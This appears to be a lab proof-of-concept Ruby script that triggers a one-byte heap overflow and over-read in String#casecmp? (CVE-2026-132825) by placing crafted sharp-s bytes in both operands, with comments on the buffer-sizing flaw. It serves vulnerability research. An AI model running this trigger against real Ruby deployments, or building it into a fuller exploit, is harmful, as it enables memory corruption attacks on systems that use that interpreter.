# W367: two independent sharp-s folds in one String#casecmp? call (CVE-2026-132825).
# str_casecmp_p (string.c:4362-4377) folds BOTH operands with rb_str_downcase(:fold),
# each with its own encoding. W364's `both_l` arm only overflowed once because its
# receiver was pre-folded ("a"+"s"*2n), not because the second fold is protected.
# Here the receiver carries n1 sharp-s bytes and the argument carries n2, so each
# operand's own case_map call can write one byte past its own capa = len + 20
# buffer, and the copy-out can read one byte past it.
#
# Run: lab/build/plain/ruby-3.4.12-plain/bin/ruby <this> 27 43
n1 = (ARGV[0] || 27).to_i
n2 = (ARGV[1] || 43).to_i
receiver = ("a".b + "\xDF".b * n1).force_encoding(Encoding::ISO_8859_1)
argument = ("a".b + "\xDF".b * n2).force_encoding(Encoding::ISO_8859_1)

begin
  result = receiver.casecmp?(argument).inspect
rescue => e
  result = "error:#{e.class}:#{e.message}"
end
print "n1=#{n1} n2=#{n2} len1=#{receiver.bytesize} len2=#{argument.bytesize} result=#{result}\n"
